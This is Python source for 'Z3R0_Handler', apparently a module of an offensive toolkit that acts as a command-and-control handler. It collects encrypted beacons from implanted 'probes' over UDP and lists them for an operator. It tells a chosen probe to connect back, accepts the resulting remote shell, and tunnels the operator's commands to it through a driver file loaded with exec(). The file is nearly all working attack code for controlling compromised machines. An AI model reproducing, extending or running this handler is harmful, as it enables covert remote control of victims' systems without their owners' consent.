class Z3R0_Handler():

	__cipher=None
	__prober=None
	__handler_socket=None
	__probe_sock=None
	__client_sock=None
	__AES_cipher=None
	__key=None
	__json_dumps=None
	__json_loads=None
	__sys=None
	__proxy_sock=None
	__handlers = []
	__LARGE_BUFFER = 1024 * 1024
	__DRIVER_PATH="drivers/z3r0-command-tunnel-driver.py"
	__probes = []

		###################################### [ HANDLER MASTER METHOD ] #############################################

	def init(self,cerbrus,args):

		from threading import Thread
		from cryptography import fernet
		from socket import socket, AF_INET, SOCK_DGRAM, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
		from json import dumps,loads
		import sys

		self.__json_dumps = dumps
		self.__json_loads = loads
		self.__sys = sys

		try:
			print("[::] Initializing ....")
			module=args[1]

			addr_str = args[2].split(":")
			prober_addr = (addr_str[0],int(addr_str[1]))

			addr_str = args[3].split(":")
			conn_addr = (addr_str[0],int(addr_str[1]))

			communication_mode =  104
			connection_id = int(args[5])

			addr_str = args[4].split(":")
			proxy_addr = (addr_str[0],int(addr_str[1]))

			self.__key =  cerbrus.getenv("MODULES")['attack'][module]['key']
			self.__AES_cipher = fernet.Fernet(self.__key)

			self.__probe_sock = socket(AF_INET,SOCK_DGRAM)
			self.__client_sock = socket(AF_INET,SOCK_STREAM)
			self.__proxy_sock = socket(AF_INET,SOCK_STREAM)

			self.__probe_sock.setsockopt(SOL_SOCKET,SO_REUSEADDR,1)
			self.__client_sock.setsockopt(SOL_SOCKET,SO_REUSEADDR,1)
			self.__proxy_sock.setsockopt(SOL_SOCKET,SO_REUSEADDR,1)
			self.__handlers = cerbrus.getenv("ACTIVE_HANDLERS")
			print("[++] Objects initialized")

			try:
				if conn_addr in self.__handlers:
					print("[!] Handler Instance using {} is already running".format(conn_addr))
					print("[!] Handler Deploy Failed")
				else:
					self.__handlers.append(conn_addr)
					cerbrus.setenv(["ACTIVE_HANDLERS",self.__handlers])

					print("[*] Binding Component Servers ....")
					self.__client_sock.bind(conn_addr)
					self.__client_sock.listen(9)
					self.__proxy_sock.bind(proxy_addr)
					self.__proxy_sock.listen(9)
					self.__probe_sock.bind(prober_addr)
					self.__probe_sock.settimeout(2)

					probe_thread = Thread(target=self.__prober,args=(self.__probe_sock,self.__probes))
					probe_thread.start()
					print("[*] Probe detection thread [ONLINE]...")

					print("[+] Component Servers [READY]:::[Waiting for user]....")
					while True:

						print("[++] Waiting for new connection...")
						user_tunnel ,user_addr = self.__proxy_sock.accept()
						cmd = user_tunnel.recv(1024).decode()
						cmd = cmd.split(":")
						print("[*] User connection is @ {}".format(user_addr))

						if cmd[0] == "KILL":
							user_tunnel.close()
							self.__handlers = cerbrus.getenv("ACTIVE_HANDLERS")
							self.__handlers.remove(conn_addr)
							cerbrus.setenv(["ACTIVE_HANDLERS",self.__handlers])

							print("[!] [HANDLER_SHUTDOWN] Killing Handler @ {}".format(conn_addr))
							self.__probe_sock.close()
							self.__proxy_sock.close()
							self.__client_sock.close()
							break

						elif cmd[0] == "CONN":
							request= {'cmd':communication_mode,'addr':list(conn_addr),'id':connection_id}
							try:

								for probe_addr in  self.__probes[int(cmd[1])]:
									print("[*] Sending COMREQ Signal to Probe @ {}".format(probe_addr))

								shell_tunnel,tunnel_addr = self.__handle_connection(request,probe_addr)
								tunnel_id = "[USER:{}::SHELL:{}]".format(user_addr,tunnel_addr)
								print("[+] New Command Tunnel Thread : {} [CREATED]".format(tunnel_id))

								cmd_tunnel = Thread(target=self.__tunnel_driver,args=(user_tunnel,shell_tunnel,self.__AES_cipher))
								cmd_tunnel.start()
								print("[**] Deployed Command Tunnel : {} [**]".format(tunnel_id))
								connection_id+=1

							except IndexError:
								print("[!] PROBE NOT FOUND AT INDEX:{}".format(cmd[1]))

							except Exception as e:
								print("[!] Exception at CONN -> {}".format(e))

						elif cmd[0] == "LIST":
							print("[*]    --------->>>>>>>>> [ PROBES ] <<<<<<<<-----------  [*]\n")
							print("\tPROBE-INDEX\tSRC-PROBE-ADDRESS\tPROBE-DATA")
							print("\t{}\n".format("-"*50))

							for probe in self.__probes:

								for addr in probe:
									index = self.__probes.index(probe)
									data = probe[addr].decode()
									print("\t{}\t\t{}\t{}".format(index,addr,data))

						else:
							print("[!] Invalid Handler Mode")

			except Exception as e:
				self.__handlers.remove(conn_addr)
				cerbrus.setenv(["ACTIVE_HANDLERS",self.___handlers])
				print("[!] [HANDLER_SHUTDOWN] Killing Handler @ {}".format(conn_addr))
				print("[!] Handler [ERROR] : {}".format(e))

		except IndexError:
			print("Usage: handler-ctl <handler-module-id> <attack-module-id> <probe-recv-addr> <handler-bind-addr> <tunnel-addr> <connection-id>")

		except Exception as e:
			print("[!] MODULE:[HANDLER] :: (Exception) = {}".format(e))

		###################################### [ HANDLER MASTER METHOD ] #############################################

	def __prober(self,probe_sock,probes):
		while True:
			try:
				probe_data ,probe_addr = self.__recvprobe()
				probe_object = {probe_addr:probe_data}

				if probe_data is not None  and probe_object not in probes:
					probes.append(probe_object)

			except Exception as e:
				print("[PROBE_SCAN_THREAD]:[ERROR] => {}".format(e))
				break

	def __tunnel_driver(self,user_tunnel,shell_tunnel,aes_cipher):
		DRIVER_FX={}
		fd = open(self.__DRIVER_PATH,"rb")
		driver_code = fd.read()
		fd.close()
		print("[*] Loading Command Tunnel Driver...")
		exec(driver_code)

	def __recvprobe(self):
		try:
			data,addr = self.__probe_sock.recvfrom(1024)
			recv_data = self.__AES_cipher.decrypt(data)
			return recv_data,addr
		except:
			return None,None

	def __handle_connection(self,request,addr):
		request_string = self.__json_dumps(request).encode()
		enc_data = self.__AES_cipher.encrypt(request_string)
		self.__probe_sock.sendto(enc_data,addr)

		cmd = ['SSHELL',{'cmd':'ls -l'}]
		enc_cmd = self.__AES_cipher.encrypt(self.__json_dumps(cmd).encode())

		shell_tunnel,shell_addr = self.__client_sock.accept()
		return shell_tunnel,shell_addr

handler = Z3R0_Handler()
print("\t[+] Z3R0-Handler :: [INITIALIZING HANDLER....]")
self.setenv(["HANDLER_MODULES",{"z3r0-handler":handler.init}])
